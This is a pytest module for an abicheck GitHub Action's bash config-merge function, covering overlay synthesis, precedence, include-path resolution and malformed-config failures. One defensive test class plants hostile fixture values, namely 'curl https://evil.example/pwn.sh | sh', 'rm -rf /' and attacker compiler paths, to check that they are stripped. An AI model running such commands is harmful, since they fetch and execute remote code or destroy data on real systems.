# Copyright 2026 Nikolay Petrov
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""``action/run.sh``'s ``add_release_topology_config_flags`` (Phase 7d,
one-comparison-product.md §4.1, ADR-068 D5).

``compare``'s ``--dso-only``/``--include-private-dso``/
``--fail-on-removed-library`` are gone from the CLI entirely (CONFIG class,
no surviving override -- ``.abicheck.yml``'s ``release:``/``gate:`` blocks
are their only source now). This Action's own dso-only/include-private-dso/
fail-on-removed-library inputs still exist, so ``run.sh`` now synthesizes a
config overlay and forwards it via ``--config`` instead of the removed
flags -- the same pattern ``add_compile_context_flags`` already established
for the ``compile:`` block (``test_action_compile_context_parity.py``).

An explicit ``--config`` (which this synthesized overlay is one) fully
REPLACES ``_resolve_compare_config``'s own auto-discovery of the
repository's ``.abicheck.yml`` (``config if config is not None else
discover_project_config()``, ``cli_compare_helpers.py``) -- it never
augments it. So both this function and ``add_compile_context_flags`` now
route their synthesized overlay through the shared
``_merge_config_overlay_with_discovered_project_config`` helper, which
discovers the real project config (if any) from the working directory the
function is called in and merges the overlay's keys into a copy of it
before writing the file this Action's ``--config`` actually points at
(Codex review, PR #1159) -- otherwise enabling e.g. ``dso-only`` would
silently drop every other project setting (``severity:``, ``suppress:``,
``scope.on_incomplete``, ...). That merge helper needs a working Python
interpreter with ``abicheck`` importable (``$_PY_BIN``/
``$_PY_BIN_HAS_ABICHECK``) and a private, PYTHONPATH-cleared working
directory to run it from (``$_PY_SAFE_DIR``) -- the same isolation every
other ``abicheck``-importing inline script in ``run.sh`` uses -- so this
harness now extracts and wires those prerequisites too, the same way
``test_action_compile_context_parity.py`` already does for
``add_flag_shlex_split``. ``$_PY_BIN`` is pinned to ``sys.executable``
(this test process's own interpreter, guaranteed to have ``abicheck``
importable) rather than resolved via ``command -v python3`` -- a real
runner's PATH lookup is exercised by the compile-context parity module's
own harness already, and pinning it here keeps this module's tests from
depending on which ``python3`` happens to be first on the test runner's
PATH.

``TestReleaseTopologyOverlayMergesWithDiscoveredProjectConfig`` is the
regression coverage for the bug itself: a real ``.abicheck.yml`` with an
unrelated setting, present in the working directory the function runs
from, must survive alongside the synthesized topology keys in the final
``--config`` document -- not be silently replaced by it.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

RUN_SH = Path(__file__).resolve().parents[1] / "action" / "run.sh"

_FN_START = "add_release_topology_config_flags() {"
_FN_END = "\n}\n"


def _add_release_topology_config_flags_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_FN_START)
    end = text.index(_FN_END, start) + len(_FN_END)
    return text[start:end]


# The shared merge helper both add_release_topology_config_flags and
# add_compile_context_flags now route through (see module docstring) --
# extracted verbatim, since the release-topology function calls it instead
# of writing its overlay directly.
_MERGE_FN_START = "_merge_config_overlay_with_discovered_project_config() {"
_MERGE_FN_END = "\n_COMPILE_CONTEXT_CONFIG_OVERLAY="


def _merge_config_overlay_fn_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_MERGE_FN_START)
    end = text.index(_MERGE_FN_END, start)
    return text[start:end]


# $_PY_SAFE_DIR/$_PY_BIN_HAS_ABICHECK: the merge helper's own prerequisites
# (it imports abicheck.config_paths and yaml, so it needs the same
# CWD-shadowing mitigation and interpreter-capability gate every other
# abicheck-importing inline script in run.sh uses). Extracted verbatim from
# the real file, same markers test_action_compile_context_parity.py's own
# `_py_safe_dir_source`/`_py_bin_has_abicheck_source` use -- a harness that
# silently left either unset/empty would exercise none of the real
# discovery-and-merge behavior these tests exist to check (mirrors that
# module's own rationale for extracting them verbatim).
_PY_SAFE_DIR_START = 'if ! _PY_SAFE_DIR="$(mktemp -d)"; then'
_PY_SAFE_DIR_END = "\ntrap 'rm -rf \"$_PY_SAFE_DIR\"' EXIT\n"
_PY_BIN_HAS_ABICHECK_START = '_PY_BIN_HAS_ABICHECK="false"'
_PY_BIN_HAS_ABICHECK_END = "\nfi\n"


def _py_safe_dir_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_PY_SAFE_DIR_START)
    end = text.index(_PY_SAFE_DIR_END, start) + len(_PY_SAFE_DIR_END)
    return text[start:end]


def _py_bin_has_abicheck_source() -> str:
    text = RUN_SH.read_text(encoding="utf-8")
    start = text.index(_PY_BIN_HAS_ABICHECK_START)
    end = text.index(_PY_BIN_HAS_ABICHECK_END, start) + len(_PY_BIN_HAS_ABICHECK_END)
    return text[start:end]


def _bash_executable() -> str:
    if os.name != "nt":
        return "bash"
    for candidate in (
        os.environ.get("GIT_BASH_PATH"),
        r"C:\Program Files\Git\bin\bash.exe",
        r"C:\Program Files\Git\usr\bin\bash.exe",
    ):
        if candidate and Path(candidate).is_file():
            return candidate
    return "bash"


def _run_bash_script(
    script: str,
    env_extra: dict[str, str] | None = None,
    *,
    check: bool = False,
    cwd: Path | None = None,
) -> subprocess.CompletedProcess[Any]:
    """Run *script* via a real bash from a temp file (Windows argv-quoting
    safety, matching test_action_compile_context_parity.py's own
    _run_bash_script -- see that module's docstring for the exact reason).

    Unlike this module's own earlier revision, *env_extra* is layered onto
    a full copy of this test process's own environment (not a from-scratch
    replacement) -- the merge helper's ``mktemp -d`` (real, not the local
    overlay-path stub) needs a real ``PATH`` to resolve, the same way
    test_action_compile_context_parity.py's own harness already inherits
    the full environment for its own external-command needs.

    *cwd* matters now that the function under test discovers a project
    ``.abicheck.yml`` from its caller's working directory (``$PWD``,
    captured before this Action's own ``cd "$_PY_SAFE_DIR"``) -- every
    caller below passes an isolated ``tmp_path`` so a real ``.abicheck.yml``
    that happens to exist above the test process's own CWD can never leak
    into a test that isn't deliberately exercising the merge.
    """
    with tempfile.NamedTemporaryFile(
        "w", suffix=".sh", delete=False, encoding="utf-8", newline="\n"
    ) as f:
        f.write(script)
        script_path = f.name
    env = {**os.environ, **(env_extra or {})}
    try:
        return subprocess.run(
            [_bash_executable(), script_path],
            capture_output=True,
            text=True,
            env=env,
            check=check,
            cwd=cwd,
            timeout=30,
        )
    finally:
        os.unlink(script_path)


def _harness() -> str:
    """A minimal ``run.sh``-shaped script: the real function body plus its
    ``_merge_config_overlay_with_discovered_project_config`` dependency and
    that helper's own ``$_PY_BIN``/``$_PY_SAFE_DIR``/``$_PY_BIN_HAS_ABICHECK``
    prerequisites (see module docstring), a ``mktemp`` wrapper that only
    intercepts the plain (no-``-d``) call the real function makes for its
    own overlay file -- a real ``mktemp -d`` still runs for real, since
    ``$_PY_SAFE_DIR`` needs an actual directory to ``cd`` into -- and a
    trailing call plus a dump of the resulting ``CMD`` array. The overlay
    path is no longer pinned to a caller-supplied marker (the merge step
    means the real function now calls ``mktemp`` more than once internally
    on some paths); callers instead read the real path back off the
    ``--config`` entry in the printed ``CMD`` array, the same convention
    ``test_action_compile_context_parity.py``'s own
    ``_read_compile_config_overlay`` uses.
    """
    fn_source = _add_release_topology_config_flags_source()
    merge_fn_source = _merge_config_overlay_fn_source()
    return f"""#!/usr/bin/env bash
set -uo pipefail
CMD=(compare)
mktemp() {{
  if [[ "${{1:-}}" == "-d" ]]; then
    command mktemp -d
  else
    command mktemp
  fi
}}
_PY_BIN="{sys.executable}"
{_py_safe_dir_source()}
{_py_bin_has_abicheck_source()}
{merge_fn_source}
{fn_source}
add_release_topology_config_flags
printf '%s\\n' "${{CMD[@]}}"
"""


def _read_config_overlay(cmd_lines: list[str]) -> dict[str, Any]:
    """Read back the merged document a ``--config <path>`` entry in
    *cmd_lines* (one CMD element per line, as the harness prints it)
    points at."""
    assert "--config" in cmd_lines, cmd_lines
    path = cmd_lines[cmd_lines.index("--config") + 1]
    with open(path, encoding="utf-8") as f:
        return json.load(f)  # type: ignore[no-any-return]


class TestReleaseTopologyOverlay:
    def test_no_inputs_leaves_cmd_untouched(self, tmp_path: Path) -> None:
        result = _run_bash_script(_harness(), cwd=tmp_path)
        assert result.returncode == 0, result.stderr
        assert result.stdout.splitlines() == ["compare"]

    def test_dso_only_synthesizes_release_block_and_config_flag(
        self, tmp_path: Path
    ) -> None:
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        lines = result.stdout.splitlines()
        assert lines[0] == "compare"
        assert lines[1] == "--config"
        doc = _read_config_overlay(lines)
        assert doc == {"release": {"dso_only": True}}

    def test_include_private_dso_synthesizes_release_block(
        self, tmp_path: Path
    ) -> None:
        result = _run_bash_script(
            _harness(), {"INPUT_INCLUDE_PRIVATE_DSO": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {"release": {"include_private_dso": True}}

    def test_fail_on_removed_library_synthesizes_gate_block(
        self, tmp_path: Path
    ) -> None:
        result = _run_bash_script(
            _harness(), {"INPUT_FAIL_ON_REMOVED_LIBRARY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {"gate": {"fail_on_removed_library": True}}

    def test_all_three_synthesize_one_combined_overlay(self, tmp_path: Path) -> None:
        result = _run_bash_script(
            _harness(),
            {
                "INPUT_DSO_ONLY": "true",
                "INPUT_INCLUDE_PRIVATE_DSO": "true",
                "INPUT_FAIL_ON_REMOVED_LIBRARY": "true",
            },
            cwd=tmp_path,
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {
            "release": {"dso_only": True, "include_private_dso": True},
            "gate": {"fail_on_removed_library": True},
        }
        # Exactly one --config flag -- not one per synthesized block.
        assert result.stdout.count("--config") == 1

    def test_build_config_together_with_dso_only_fails_loud(
        self, tmp_path: Path
    ) -> None:
        result = _run_bash_script(
            _harness(),
            {"INPUT_DSO_ONLY": "true", "INPUT_BUILD_CONFIG": "/repo/.abicheck.yml"},
            cwd=tmp_path,
        )
        assert result.returncode == 1
        assert "cannot combine" in result.stdout
        assert "release:/gate:" in result.stdout

    def test_build_config_alone_is_fine(self, tmp_path: Path) -> None:
        """The mutual-exclusivity guard only fires when a release-topology
        input is also set -- build-config alone (no dso-only/
        include-private-dso/fail-on-removed-library) is the ordinary case
        every ADR-037 D4 project config already exercises."""
        result = _run_bash_script(
            _harness(), {"INPUT_BUILD_CONFIG": "/repo/.abicheck.yml"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        assert result.stdout.splitlines() == ["compare"]

    def test_double_config_bug_guard_fires_loud_not_silent(
        self, tmp_path: Path
    ) -> None:
        """A defensive check inside the function itself: if CMD already
        carries --config (a caller bug, not a user input problem), the
        function refuses to add a second one rather than emitting an
        invalid two---config command line silently."""
        fn_source = _add_release_topology_config_flags_source()
        merge_fn_source = _merge_config_overlay_fn_source()
        script = f"""#!/usr/bin/env bash
set -uo pipefail
CMD=(compare --config /already/there.yml)
_PY_BIN="{sys.executable}"
{_py_safe_dir_source()}
{_py_bin_has_abicheck_source()}
{merge_fn_source}
{fn_source}
add_release_topology_config_flags
printf '%s\\n' "${{CMD[@]}}"
"""
        result = _run_bash_script(script, {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path)
        assert result.returncode == 1
        assert "already added to the command line" in result.stdout


class TestReleaseTopologyOverlayMergesWithDiscoveredProjectConfig:
    """Codex review, PR #1159 (P1): the synthesized overlay must AUGMENT the
    repository's own auto-discovered ``.abicheck.yml``, never silently
    replace it -- an explicit ``--config`` (this overlay is one) fully
    replaces ``_resolve_compare_config``'s own auto-discovery, so without
    the merge, enabling e.g. ``dso-only`` would drop every other project
    setting (``scope.on_incomplete: block``, ``severity:``, ...)."""

    def test_discovered_scope_and_severity_survive_alongside_dso_only(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "scope:\n"
            "  on_incomplete: block\n"
            "severity:\n"
            "  abi_breaking: error\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # The discovered project's own settings must still be present...
        assert doc["scope"] == {"on_incomplete": "block"}
        assert doc["severity"] == {"abi_breaking": "error"}
        # ...alongside the synthesized topology key, not instead of it.
        assert doc["release"] == {"dso_only": True}

    def test_discovered_release_key_a_conflicting_input_wins_over(
        self, tmp_path: Path
    ) -> None:
        """A key the discovered config and the Action input both name is
        decided by the Action input -- the same precedence an explicit
        build-config input already takes over auto-discovery."""
        (tmp_path / ".abicheck.yml").write_text(
            "release:\n"
            "  dso_only: false\n"
            "  include_private_dso: true\n"
            "scope:\n"
            "  on_incomplete: block\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # dso_only: the Action input (true) wins over the discovered false.
        # include_private_dso: not named by any input, so the discovered
        # value passes through untouched.
        assert doc["release"] == {"dso_only": True, "include_private_dso": True}
        assert doc["scope"] == {"on_incomplete": "block"}

    def test_no_discovered_config_is_the_pre_existing_base_case(
        self, tmp_path: Path
    ) -> None:
        """No ``.abicheck.yml`` anywhere above *tmp_path* (an isolated
        pytest tmp dir, never itself inside a real checkout) -- the merged
        document degrades to exactly the overlay alone, unchanged from
        this Action's pre-merge behavior."""
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc == {"release": {"dso_only": True}}


class TestReleaseTopologyOverlayKeepsDiscoveredConfigUntrusted:
    """Codex review, PR #1159 (P1, security): the merged document is always
    written to the scratch path this Action passes via ``--config`` --
    which every "was --config explicit" check in the engine
    (``cli_options.py``'s ``compile.compiler`` gate, ADR-032 D5's
    ``build.query`` gate) treats as operator authorization to execute.
    Copying either key from the discovered (untrusted, repository-
    controlled) ``.abicheck.yml`` into that always-explicit overlay would
    launder it into "operator authorized this to run" the moment any
    unrelated Action input is set -- so both must never appear in the
    merged document at all."""

    def test_discovered_build_query_is_stripped(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "build:\n"
            "  query: 'curl https://evil.example/pwn.sh | sh'\n"
            "  system: cmake\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        # The dangerous key is gone entirely; an unrelated sibling key in
        # the same block still passes through.
        assert "query" not in doc.get("build", {})
        assert doc["build"] == {"system": "cmake"}
        assert "build.query" in result.stderr

    def test_discovered_compile_compiler_is_stripped(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "compile:\n  compiler: /tmp/attacker-planted-cc\n  std: c++20\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert "compiler" not in doc.get("compile", {})
        assert doc["compile"] == {"std": "c++20"}
        assert "compile.compiler" in result.stderr

    def test_both_dangerous_keys_stripped_together(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "build:\n  query: 'rm -rf /'\n"
            "compile:\n  compiler: /malicious/cc\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert "query" not in doc.get("build", {})
        assert "compiler" not in doc.get("compile", {})
        # No dangerous value leaked into the merged document at all.
        serialized = json.dumps(doc)
        assert "rm -rf" not in serialized
        assert "/malicious/cc" not in serialized


class TestReleaseTopologyOverlayResolvesRelativePathsAgainstRealProjectRoot:
    """Codex review, PR #1159 (P1, correctness): a relative
    ``compile.include_dirs`` entry in the discovered config must resolve
    against that config's own project root, not against wherever the
    ``mktemp`` scratch overlay file happens to be written (typically
    under ``/tmp``) -- else headers silently disappear from extraction."""

    def test_relative_include_dir_resolves_against_project_root_not_tmp(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / "include").mkdir()
        (tmp_path / ".abicheck.yml").write_text(
            "compile:\n  include_dirs: [include]\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        resolved = doc["compile"]["include_dirs"]
        assert resolved == [str((tmp_path / "include").resolve())]
        # Explicitly not resolved against the scratch file's own directory.
        assert not resolved[0].startswith("/tmp") or resolved[0].startswith(
            str(tmp_path.resolve())
        )

    def test_multiple_relative_include_dirs_all_resolve(
        self, tmp_path: Path
    ) -> None:
        (tmp_path / "a").mkdir()
        (tmp_path / "b").mkdir()
        (tmp_path / ".abicheck.yml").write_text(
            "compile:\n  include_dirs: [a, b]\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["compile"]["include_dirs"] == [
            str((tmp_path / "a").resolve()),
            str((tmp_path / "b").resolve()),
        ]

    def test_absolute_include_dir_is_left_unchanged(self, tmp_path: Path) -> None:
        abs_dir = str((tmp_path / "somewhere").resolve())
        (tmp_path / ".abicheck.yml").write_text(
            f"compile:\n  include_dirs: [{abs_dir}]\n",
            encoding="utf-8",
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode == 0, result.stderr
        doc = _read_config_overlay(result.stdout.splitlines())
        assert doc["compile"]["include_dirs"] == [abs_dir]


class TestReleaseTopologyOverlayFailsLoudOnMalformedDiscoveredConfig:
    """Codex review, PR #1159 (P2): a malformed/unreadable discovered
    ``.abicheck.yml`` must fail the Action step loudly -- matching the
    ordinary CLI's own ``discover_project_config()`` behavior -- rather
    than silently proceeding as if no project config existed."""

    def test_malformed_yaml_fails_the_step(self, tmp_path: Path) -> None:
        (tmp_path / ".abicheck.yml").write_text(
            "release: [unterminated\n", encoding="utf-8"
        )
        result = _run_bash_script(
            _harness(), {"INPUT_DSO_ONLY": "true"}, cwd=tmp_path
        )
        assert result.returncode != 0
        assert "failed to parse the discovered project config" in result.stderr
        assert "failed to merge" in result.stdout
        # Must not silently write a merged overlay and proceed.
        assert "--config" not in result.stdout
